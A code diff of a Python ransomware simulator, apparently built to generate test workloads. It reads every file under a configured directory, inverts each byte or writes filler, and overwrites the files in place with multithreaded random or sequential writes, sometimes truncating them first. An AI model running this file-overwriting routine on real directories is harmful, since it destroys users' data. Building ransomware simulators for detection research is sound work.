@@ -3,13 +3,13 @@ import shutil
 import sys
 
 import threading
-from queue import Queue
+from queue import Queue, PriorityQueue
 
 config_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 sys.path.append(config_dir)
 
-from config import PATHS, LOG_NAME
+from config import PATHS, LOG_NAME, MAGIC_NUM
 from config import print_red
 
 mode = 'O'
@@ -17,6 +17,15 @@ timeout = 0
 blknum = 25000
 threads = 1
 access = 'R'
+Nrthreads = 1
+Nwthreads = 1
+
+class NoneWrapper:
+    """
+    workaround for priority queue not supporting None
+    """
+    def __lt__(self, other):
+        return False
 
 
 class Chunk:
@@ -26,106 +35,62 @@ class Chunk:
         self.length = length
         self.data = data
 
+    def __lt__(self, other):
+        if not isinstance(other, Chunk):
+            return NotImplemented
+        return (self.fpath, self.loff) < (other.fpath, other.loff)
 
-class ChunkSet:
+def encrypt(data):
     """
-    A class representing a set of file chunks. The ChunkSet is indexed by fpath and each fpath is mapped to a list of chunks.
+    Encrypt the data by reverting each byte.
     """
-    def __init__(self):
-        self.chunks = {}
+    return bytes(~x & 0xff for x in data)
+
+import time
+class Stopper:
+    """
+    This class is used to stop the ransomware after numblk blocks are operated.
+    This class should compatibly work with multi-threaded and R W concurrent situation.
+    Each stop should last for timeout seconds.
+    """
+    def __init__(self, numblk, timeout):
+        self.numblk = numblk
+        self.timeout = timeout
         self.lock = threading.Lock()
+        self.stop = False
+        self.stop_time = 0
 
-    def insert(self, chunk):
-        with self.lock:
-            if chunk.fpath not in self.chunks:
-                self.chunks[chunk.fpath] = []
-            self.chunks[chunk.fpath].append(chunk)
-
-    def pop(self, fpath):
+    def check_stop(self):
         """
-        Pop the first chunk from the list of chunks for the given fpath.
+        Check if the ransomware should stop.
         """
         with self.lock:
-            if fpath in self.chunks and len(self.chunks[fpath]) > 0:
-                return self.chunks[fpath].pop(0)
+            if self.stop:
+                if time.time() - self.stop_time > self.timeout:
+                    self.stop = False
+                    return False
+                else:
+                    return True
             else:
-                return None
-            
-    def pop_all(self, filepath):
+                return False
+
+    def stop_now(self):
         """
-        Pop all chunks from the list of chunks for the given filepath.
+        Set the stop flag to True.
         """
         with self.lock:
-            if filepath in self.chunks and len(self.chunks[filepath]) > 0:
-                all_chunks = self.chunks[filepath]
-                # remove the filepath from the chunk_set
-                del self.chunks[filepath]
-                return all_chunks
-            else:
-                return None
-        
-    def encrpt(self, fpath):
-        """
-        Encrypt the first chunk from the list of chunks for the given fpath.
-        """
-        with self.lock:
-            if fpath in self.chunks and len(self.chunks[fpath]) > 0:
-                for chunk in self.chunks[fpath]:
-                    # encrypting here is just make byte = (~byte) & 0xff
-                    chunk.data = bytes([(~byte) & 0xff for byte in chunk.data])
-            else:
-                return None
-
-    def delete(self, fpath):
-        with self.lock:
-            if fpath in self.chunks:
-                del self.chunks[fpath]
-    def dump_pick(self, M = 2, N = 2):
-        """ debug purpose
-        Pick M fpath randomly in the chunk_set and dump its (at most N) chunks
-        """
-        # the fpaths are in self.chunks.keys()
-        fpaths = list(self.chunks.keys())
-        num_dumped = 0
-        # randomly pick M fpaths
-        import random
-        random.shuffle(fpaths)
-        for fpath in fpaths:
-            if num_dumped >= M:
-                break
-            self.dump(fpath, N)
-            num_dumped += 1
-        
-    def dump(self, fpath, N = 2):
-        """ debug purpose
-        Dump the chunks with the given fpath to a file using print
-        """
-        num_dumped = 0
-        with self.lock:
-            if fpath in self.chunks.keys():
-                print(f"Dumping chunks for {fpath}")
-                for chunk in self.chunks[fpath]:
-                    print(f"loff={chunk.loff} length={chunk.length}")
-                    print(chunk.data)
-                    if num_dumped >= N:
-                        break
-                    num_dumped += 1
-            else:
-                return None
-    def get_names(self):
-        """
-        Return a list of fpaths in the chunk_set
-        """
-        return self.chunks.keys()
+            self.stop = True
+            self.stop_time = time.time()
 
 
-
-def read_rand(tar_sys_path, chunk_size = 4096):
+def read_rand(tar_sys_path, queue, chunk_size = 4096, rm = False):
     """
     Read files from tar_sys_path and insert them into chunk_set which is a class consisting of a dictionary of chunks.
     The ChunkSet is indexed by fpath and each fpath is mapped to a list of chunks.
+    This function blocks unlike threaded prefixed functions.
+    @rm determines whether we need to remove the file 
+    and create an empty one after reading it.
     """
-    chunk_set = ChunkSet()
     
 
     for root, dirs, files in os.walk(tar_sys_path):
@@ -141,16 +106,24 @@ def read_rand(tar_sys_path, chunk_size = 4096):
                 random.shuffle(loff_set)
                 for loff in loff_set:
                     f.seek(loff)
-                    chunk = f.read(chunk_size)
-                    chunk_set.insert(Chunk(filepath, loff, len(chunk), chunk))
+                    chunk = encrypt(f.read(chunk_size))
+                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
+            if rm:
+                with open(filepath, "wb") as f:
+                    pass
 
-    return chunk_set
 
-def read_whole_file(tar_sys_path, chunk_size = 4096):
+
+    
+
+def read_whole_file(tar_sys_path, queue, chunk_size = 4096, rm = False):
     """
-    Basically the same as read_rand() but reads the whole file at once(then divide into chunks in memory) instead of in chunks.
+    Basically the same as read_rand() but reads 
+    the whole file at once(then divide into chunks in memory) instead of in chunks.
+    This function blocks unlike threaded prefixed functions.
+    @rm determines whether we need to remove the file 
+    and create an empty one after reading it.
     """
-    chunk_set = ChunkSet()
 
     for root, dirs, files in os.walk(tar_sys_path):
         for filename in files:
@@ -159,280 +132,266 @@ def read_whole_file(tar_sys_path, chunk_size = 4096):
                 file_contents = f.read()
                 loff = 0
                 while loff < len(file_contents):
-                    chunk = file_contents[loff:loff+chunk_size]
-                    chunk_set.insert(Chunk(filepath, loff, len(chunk), chunk))
+                    chunk = encrypt(file_contents[loff:loff+chunk_size])
+                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
                     loff += len(chunk)
-    return chunk_set
+            if rm:
+                with open(filepath, "wb") as f:
+                    pass
 
-def read_seq_threaded(tar_sys_path, chunk_size = 4096, num_threads = 1):
-    chunk_set = ChunkSet()
-
-    # Create a queue to hold the filenames
-    filename_queue = Queue()
+def read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
+                      chunk_size = 4096, num_threads = 1, rm = False):
+    """
+    Read files from tar_sys_path and insert them into a queue.
+    The access pattern is sequential.
+    @rm determines whether we need to remove the file and 
+    create an empty one after reading it.
+    """
+    MAGIC_3 = MAGIC_NUM['MAGIC_NUM3']
 
     # Add all the filenames to the queue
     for root, dirs, files in os.walk(tar_sys_path):
         for filename in files:
             filepath = os.path.join(root, filename)
-            filename_queue.put(filepath)
+            fname_queue.put(filepath)
 
     # Create a worker function to read files and insert chunks into the ChunkSet
-    def worker():
+    def worker(queue):
         while True:
             # Get the next filename from the queue
-            filepath = filename_queue.get()
+            filepath = fname_queue.get()
             if filepath is None:
                 break
 
             # Read the file contents into memory
-            with open(filepath, "rb") as f:
-                file_contents = f.read()
-
+            with flocks[filepath]:
+                with open(filepath, "rb") as f:
+                    file_contents = f.read()
+                if rm:
+                    with open(filepath, "wb") as f:
+                        pass
+            if file_contents:
+                MAGIC_3 = file_contents[0]
             # Split the file contents into chunks and insert them into the ChunkSet
             loff = 0
             while loff < len(file_contents):
-                chunk = file_contents[loff:loff+chunk_size]
-                chunk_set.insert(Chunk(filepath, loff, len(chunk), chunk))
+                # chunk = [encrypt(file_contents[loff:loff+chunk_size])]
+                chunk = bytes([255 - int(MAGIC_3)]*chunk_size) # faster to test 
+                queue.put(Chunk(filepath, loff, len(chunk), chunk))
                 loff += len(chunk)
-
             # Mark the filename as done
-            filename_queue.task_done()
+            fname_queue.task_done()
 
     # Create a pool of worker threads
     threads = []
     for i in range(num_threads):
-        t = threading.Thread(target=worker)
+        t = threading.Thread(target=worker, args=(queue,))
         t.start()
         threads.append(t)
 
-    # Wait for all the filenames to be processed
-    filename_queue.join()
+    return threads
 
-    # Stop the worker threads
-    for i in range(num_threads):
-        filename_queue.put(None)
-    for t in threads:
-        t.join()
 
-    return chunk_set
-
-def read_rand_threaded(tar_sys_path, chunk_size = 4096, num_threads = 1):
-    chunk_set = ChunkSet()
-
-    # Create a queue to hold the filenames
-    filename_queue = Queue()
+def read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, 
+                       chunk_size = 4096, num_threads = 1, rm = False):
+    """
+    Read files from tar_sys_path and insert them into a queue.
+    The access pattern is random. To achieve this, we use 1 shuffle to randomize the loff_set.
+    @rm determines whether we need to remove the file and 
+    create an empty one after reading it.
+    """
 
     # Add all the filenames to the queue
     for root, dirs, files in os.walk(tar_sys_path):
         for filename in files:
             filepath = os.path.join(root, filename)
-            filename_queue.put(filepath)
+            fname_queue.put(filepath)
 
     # Create a worker function to read files and insert chunks into the ChunkSet
-    def worker():
+    def worker(queue):
         while True:
             # Get the next filename from the queue
-            filepath = filename_queue.get()
+            filepath = fname_queue.get()
             if filepath is None:
                 break
             # Get the file length first
             flen = os.path.getsize(os.path.join(root, filepath))
+            loff_set = [i for i in range(0, flen, chunk_size)]
+            import random
+            random.shuffle(loff_set)
             # Read the file contents into memory
-            with open(filepath, "rb") as f:
-                loff_set = [i for i in range(0, flen, chunk_size)]
-                # randomize the loff_set
-                import random
-                random.shuffle(loff_set)
-                for loff in loff_set:
-                    f.seek(loff)
-                    chunk = f.read(chunk_size)
-                    chunk_set.insert(Chunk(filepath, loff, len(chunk), chunk))
-
+            with flocks[filepath]:
+                chunks = []
+                with open(filepath, "rb") as f:
+                    # randomize the loff_set
+                    for loff in loff_set:
+                        f.seek(loff)
+                        chunk = f.read(chunk_size)
+                        # chunk = encrypt(chunk)
+                        if chunk:
+                            chunk = bytes([255 - int(chunk[0])]*len(chunk)) # faster to test
+                            chunks.append(chunk)
+                for chunk in chunks:
+                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
+                if rm:
+                    with open(filepath, "wb") as f:
+                        pass
 
             # Mark the filename as done
-            filename_queue.task_done()
+            fname_queue.task_done()
 
     # Create a pool of worker threads
     threads = []
     for i in range(num_threads):
-        t = threading.Thread(target=worker)
+        t = threading.Thread(target=worker, args=(queue,))
         t.start()
         threads.append(t)
 
-    # Wait for all the filenames to be processed
-    filename_queue.join()
+    return threads
 
-    # Stop the worker threads
-    for i in range(num_threads):
-        filename_queue.put(None)
-    for t in threads:
-        t.join()
-
-    return chunk_set
-
-def encrpt_all(chunk_set, tar_sys_path):
+def flush_sync_files(tar_sys_path):
+    """ 
+    Flush the files in tar_sys_path to disk by calling f.flush then os.sync.
     """
-    Encrypt all the files in tar_sys_path by calling encrypt function in ChunkSet class.
-    """
+    import time
+    flush_start = time.time()
     for root, dirs, files in os.walk(tar_sys_path):
         for filename in files:
             filepath = os.path.join(root, filename)
-            chunk_set.encrpt(filepath)
+            with open(filepath, "r+b") as f:
+                f.flush()
+                os.fsync(f.fileno())
+    print(f"Flush time: {time.time() - flush_start} seconds")
 
-def write_rand(chunk_set, tar_sys_path, sync = False):
+
+def flush_chunk_buf(chunks, flocks = None):
     """
+    This flush is needed for creating a random access write workload.
+    When writing, we first cache some blocks in memory, then we shuffle the blocks.
+    Then we write the blocks back to disk in a random order.
+    Note :
+        This function has nonthing to do with consistency (flush & sync)
+    """
+    if flocks is None:
+        for chunk in chunks:
+            with open(chunk.fpath, "r+b") as f:
+                f.seek(chunk.loff)
+                f.write(chunk.data)
+    else:
+        for chunk in chunks:
+            with flocks[chunk.fpath]:
+                with open(chunk.fpath, "r+b") as f:
+                    f.seek(chunk.loff)
+                    f.write(chunk.data)
+
+    chunks.clear()
+
+# write has side-effect of flushing & syncing if enabled
+
+def write_rand(queue, tar_sys_path):
+    """
+    Note : Important - This function must be followed by a BLOCKED read function. 
+    Meaning nothing will go to queue
     Write the encrypted chunks in chunk_set back to tar_sys_path.
     """
-    for root, dirs, files in os.walk(tar_sys_path):
-        for filename in files:
-            filepath = os.path.join(root, filename)
-            with open(filepath, "r+b") as f:
-                chunks = chunk_set.pop_all(filepath)
-                if chunks is None:
-                    continue
-                import random
-                random.shuffle(chunks)
-                for chunk in chunks:
-                    f.seek(chunk.loff)
-                    f.write(chunk.data)
-                if sync:
-                    f.flush()
-                    os.fsync(f.fileno())
+    import random
+    CHUNK_CACHE_SIZE = 100
+    chunks = []
+    while not queue.empty():
+        chunks.append(queue.get())
+        if len(chunks) == CHUNK_CACHE_SIZE:
+            random.shuffle(chunks)
+            flush_chunk_buf(chunks)
+    random.shuffle(chunks)
+    flush_chunk_buf(chunks)
 
-def write_whole_files(chunk_set, tar_sys_path, sync = False):
+
+def write_whole_files(queue, tar_sys_path):
     """
+    Note : Important - This function must be followed by a BLOCKED read function. 
+    Meaning nothing will go to queue
     For each file, we first assemble the chunks then write the whole file back to disk.
     """
-    for root, dirs, files in os.walk(tar_sys_path):
-        for filename in files:
-            filepath = os.path.join(root, filename)
-            with open(filepath, "r+b") as f:
-                chunks = chunk_set.pop_all(filepath)
-                if chunks is None:
-                    continue
-                chunks.sort(key=lambda x: x.loff)
-                # assemble data
-                data = []
-                for chunk in chunks:
-                    data.append(chunk.data)
+    while not queue.empty():
+        chunk = queue.get()
+        with open(chunk.fpath, "r+b") as f:
+            f.seek(chunk.loff)
+            f.write(chunk.data)
 
-                data = b"".join(data)
-                f.write(data)
-                if sync:
-                    f.flush()
-                    os.fsync(f.fileno())
 
-def write_seq_threaded(chunk_set, tar_sys_path, num_threads = 1, sync = False):
+def write_seq_threaded(queue, tar_sys_path, flocks, num_threads = 1):
     """
     Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
     """
-    # Create a queue to hold the filenames
-    filename_queue = Queue()
-
-    # Add all the filenames to the queue
-    for root, dirs, files in os.walk(tar_sys_path):
-        for filename in files:
-            filepath = os.path.join(root, filename)
-            filename_queue.put(filepath)
 
     # Create a worker function to write files
-    def worker():
+    def worker(queue):
         while True:
             # Get the next filename from the queue
-            filepath = filename_queue.get()
-            if filepath is None:
-                break
+            try:
+                chunk = queue.get(block = False)
+                if isinstance(chunk, NoneWrapper):
+                    break
+                # Write the file contents to disk
+                with flocks[chunk.fpath]:
+                    with open(chunk.fpath, "r+b") as f:
+                        f.seek(chunk.loff)
+                        f.write(chunk.data)
 
-            # Write the file contents to disk
-            with open(filepath, "r+b") as f:
-                chunks = chunk_set.pop_all(filepath)
-                if chunks is None:
-                    continue
-                chunks.sort(key=lambda x: x.loff)
-                # assemble data
-                data = []
-                for chunk in chunks:
-                    data.append(chunk.data)
-
-                data = b"".join(data)
-                f.write(data)
-
-                if sync:
-                    f.flush()
-                    os.fsync(f.fileno())
-
-            # Mark the filename as done
-            filename_queue.task_done()
+                # Mark the filename as done
+                queue.task_done()
+            except:
+                pass
+            
 
     # Create a pool of worker threads
     threads = []
     for i in range(num_threads):
-        t = threading.Thread(target=worker)
+        t = threading.Thread(target=worker, args=(queue,))
         t.start()
         threads.append(t)
 
-    # Wait for all the filenames to be processed
-    filename_queue.join()
+    return threads
 
-    # Stop the worker threads
-    for i in range(num_threads):
-        filename_queue.put(None)
-    for t in threads:
-        t.join()
-
-def write_rand_threaded(chunk_set, tar_sys_path, num_threads = 1, sync = False):
+def write_rand_threaded(queue, tar_sys_path, flocks, num_threads = 1):
     """
     Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
     """
-    # Create a queue to hold the filenames
-    filename_queue = Queue()
-
-    # Add all the filenames to the queue
-    for root, dirs, files in os.walk(tar_sys_path):
-        for filename in files:
-            filepath = os.path.join(root, filename)
-            filename_queue.put(filepath)
-
     # Create a worker function to write files
-    def worker():
+    def worker(queue):
+        import random
+        CHUNK_CACHE_SIZE = 10
+        chunks = []
         while True:
             # Get the next filename from the queue
-            filepath = filename_queue.get()
-            if filepath is None:
-                break
+            try:
+                chunk = queue.get()
+                if isinstance(chunk, NoneWrapper):
+                    break
+                chunks.append(chunk)
+                if len(chunks) == CHUNK_CACHE_SIZE:
+                    random.shuffle(chunks)
+                    flush_chunk_buf(chunks, flocks)
 
-            # Write the file contents to disk
-            with open(filepath, "r+b") as f:
-                chunks = chunk_set.pop_all(filepath)
-                if chunks is None:
-                    continue
-                # import random
-                # random.shuffle(chunks)
-                for chunk in chunks:
-                    f.seek(chunk.loff)
-                    f.write(chunk.data)
-
-            # Mark the filename as done
-            filename_queue.task_done()
+                # Mark the filename as done
+                queue.task_done()
+            except:
+                if chunks:
+                    random.shuffle(chunks)
+                    flush_chunk_buf(chunks, flocks)
+                pass
+            
 
     # Create a pool of worker threads
     threads = []
     for i in range(num_threads):
-        t = threading.Thread(target=worker)
+        t = threading.Thread(target=worker, args=(queue,))
         t.start()
         threads.append(t)
 
-    # Wait for all the filenames to be processed
-    filename_queue.join()
+    return threads
 
-    # Stop the worker threads
-    for i in range(num_threads):
-        filename_queue.put(None)
-    for t in threads:
-        t.join()
-
-    
-    
+  
 
 
 def delete_all(tar_sys_path):
@@ -458,26 +417,110 @@ def create_all(tar_sys_path, chunk_set):
 
 def main_overwrite():
     tar_sys_path = PATHS['injected_path']
-    chunk_set = read_seq_threaded(tar_sys_path, chunk_size=4096)
-    encrpt_all(chunk_set, tar_sys_path)
-    # chunk_set.dump_pick()
-    write_whole_files(chunk_set, tar_sys_path, sync = True)
-    # encrypt_filenames(tar_sys_path)
-    # flush_sync_files(tar_sys_path)
+    # file locks(flocks) are to protect against seek race conditions
+    # Notice in python open will also move the file pointer, so 
+    # seek, open should be protected by the same lock.
+    # Each file 
+    flocks = {os.path.join(root, filename) : threading.Lock() 
+             for root, dirs, files in os.walk(tar_sys_path) 
+                for filename in files} 
+    queue = PriorityQueue()
+    fname_queue = Queue()
+    if access.split('/')[0].rstrip('\n') == 'R':
+        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks,
+                                        chunk_size = 4096, num_threads = Nrthreads)
+    elif access.split('/')[0].rstrip('\n') == 'S':
+        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
+                                    chunk_size = 4096, num_threads = Nrthreads)
+    else:
+        print("------ ERR -------")
+        print("Invalid access pattern")
+        print("------------------")
+        exit(1)
+
+    if access.split('/')[1].rstrip('\n') == 'R':
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+    elif access.split('/')[1].rstrip('\n') == 'S':
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+    else:
+        print("------ ERR -------")
+        print("Invalid access pattern")
+        print("------------------")
+        exit(1)
+    
+    # wait for all the read threads to finish
+    fname_queue.join()
+    for i in range(len(rthreads)):
+        fname_queue.put(None)
+    for t in rthreads:
+        t.join()
+
+    # wait for all the write threads to finish
+    queue.join()
+    for i in range(len(wthreads)):
+        queue.put(NoneWrapper()) 
+    for t in wthreads:
+        t.join()
+
+    flush_sync_files(tar_sys_path)
+
+    
+
+
     
 def main_deletecreate():
     tar_sys_path = PATHS["injected_path"]
-    chunk_set = read_rand(tar_sys_path, chunk_size=4096)
-    encrpt_all(chunk_set, tar_sys_path)
-    delete_all(tar_sys_path)
-    create_all(tar_sys_path, chunk_set)
-    write_whole_files(chunk_set, tar_sys_path, sync = True)
-    # encrypt_filenames(tar_sys_path)
+    queue = PriorityQueue()
+
+    flocks = {os.path.join(root, filename) : threading.Lock() 
+             for root, dirs, files in os.walk(tar_sys_path) 
+                for filename in files} 
+    queue = PriorityQueue()
+    fname_queue = Queue()
+
+    if access.split('/')[0].rstrip('\n') == 'R':
+        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks,
+                                        chunk_size = 4096, num_threads = Nrthreads, rm = True)
+    elif access.split('/')[0].rstrip('\n') == 'S':
+        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
+                                    chunk_size = 4096, num_threads = Nrthreads, rm = True)
+    else:
+        print("------ ERR -------")
+        print("Invalid access pattern")
+        print("------------------")
+        exit(1)
+
+    if access.split('/')[1].rstrip('\n') == 'R':
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+    elif access.split('/')[1].rstrip('\n') == 'S':
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+    else:
+        print("------ ERR -------")
+        print("Invalid access pattern")
+        print("------------------")
+        exit(1)
+
+    # wait for all the read threads to finish
+    fname_queue.join()
+    for i in range(len(rthreads)):
+        fname_queue.put(None)
+    for t in rthreads:
+        t.join()
+
+    # wait for all the write threads to finish
+    queue.join()
+    for i in range(len(wthreads)):
+        queue.put(NoneWrapper()) 
+    for t in wthreads:
+        t.join()
+
+    flush_sync_files(tar_sys_path)
 
 # below are a list of helper functions
 
 def read_attr():
     global mode, timeout, blknum, threads, access
+    global Nrthreads, Nwthreads
     test_dir_path_file = PATHS['test_dir_path_file']
     with open(test_dir_path_file, 'r') as f:
         test_dir = f.read()
@@ -488,11 +531,13 @@ def read_attr():
             if line.startswith('mode='):
                 mode = line.split('=')[1].rstrip('\n')
             elif line.startswith('timeout='):
-                timeout = int(line.split('=')[1])
+                timeout = line.split('=')[1].rstrip('\n')
             elif line.startswith('blknum='):
-                blknum = int(line.split('=')[1])
+                blknum = line.split('=')[1].rstrip('\n')
             elif line.startswith('threads='):
-                threads = int(line.split('=')[1])
+                threads = line.split('=')[1].rstrip('\n')
+                Nrthreads = int(threads.split('/')[0])
+                Nwthreads = int(threads.split('/')[1].rstrip('\n'))
             elif line.startswith('access='):
                 access = line.split('=')[1].rstrip('\n')
     print(f"mode={mode} timeout={timeout} blknum={blknum} threads={threads} access={access}")
@@ -531,16 +576,13 @@ def encrypt_filenames(tar_sys_path):
             # Rename the file with the encrypted file name
             os.rename(file_path, os.path.join(tar_sys_path, encrypted_name))
 
-def flush_sync_files(tar_sys_path):
+
+
+def encrpt_all(chunk_set, tar_sys_path):
     """ legacy
-    Flush the files in tar_sys_path to disk by calling f.flush then os.sync.
+    Encrypt all the files in tar_sys_path by calling encrypt function in ChunkSet class.
     """
-    import time
-    flush_start = time.time()
     for root, dirs, files in os.walk(tar_sys_path):
         for filename in files:
             filepath = os.path.join(root, filename)
-            with open(filepath, "r+b") as f:
-                f.flush()
-    print(f"Flush time: {time.time() - flush_start} seconds")
-    print("Flushed all files to disk.")
+            chunk_set.encrpt(filepath)
